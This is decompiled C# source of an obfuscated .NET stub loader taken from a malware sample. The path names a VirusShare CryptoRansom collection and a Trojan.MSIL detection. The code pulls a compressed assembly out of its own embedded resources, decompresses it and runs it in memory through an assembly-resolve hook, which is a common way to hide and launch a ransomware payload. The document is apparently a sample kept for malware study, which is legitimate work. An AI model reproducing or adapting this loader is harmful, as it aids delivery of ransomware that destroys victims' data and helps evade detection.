// Decompiled with JetBrains decompiler
// Type: <Module>
// Assembly: StubLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=91dca1aa8aeb9cc2
// MVID: 39BCF4AF-8830-4837-8671-E11FBAC8211F
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.MSIL.Generic-8db8492607a9b32d1e0dbe4fb343609d3b9c6660a9c6d4be2008abddb0a6c3ea.exe

using \u0007;
using \u001D;
using \u007F;
using SmartAssembly.MemoryManagement;
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

internal class \u003CModule\u003E
{
  [STAThread]
  public static int \u0002([In] string[] obj0)
  {
    if (true)
      goto label_2;
label_1:
    AppDomain currentDomain = AppDomain.CurrentDomain;
    currentDomain.AssemblyResolve += new ResolveEventHandler(\u003CModule\u003E.\u0003);
    return currentDomain.ExecuteAssemblyByName(new AssemblyName(\u001F.\u001E(210)), (Evidence) null, obj0);
label_2:
    MemoryManager.\u0005();
    goto label_1;
  }

  public static Assembly \u0003([In] object obj0, [In] ResolveEventArgs obj1) => \u003CModule\u003E.\u0004(Convert.ToBase64String(Encoding.Default.GetBytes(obj1.Name.ToLowerInvariant())));

  public static Assembly \u0004([In] string obj0)
  {
    Assembly assembly;
    do
    {
      Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(obj0);
      if (true)
        goto label_14;
label_1:
      Stream stream;
      try
      {
        Stream input1 = stream;
        if (input1 == null)
        {
          if (true)
            assembly = (Assembly) null;
        }
        else
        {
          int count = new BinaryReader(input1).ReadInt32();
          using (DeflateStream input2 = new DeflateStream(stream, CompressionMode.Decompress))
            assembly = Assembly.Load(new BinaryReader((Stream) input2).ReadBytes(count));
        }
      }
      finally
      {
        stream?.Dispose();
      }
      continue;
label_14:
      stream = manifestResourceStream;
      goto label_1;
    }
    while (false);
    return assembly;
  }

  static \u003CModule\u003E()
  {
    \u0006.\u0005();
    \u001C.\u0005();
  }
}
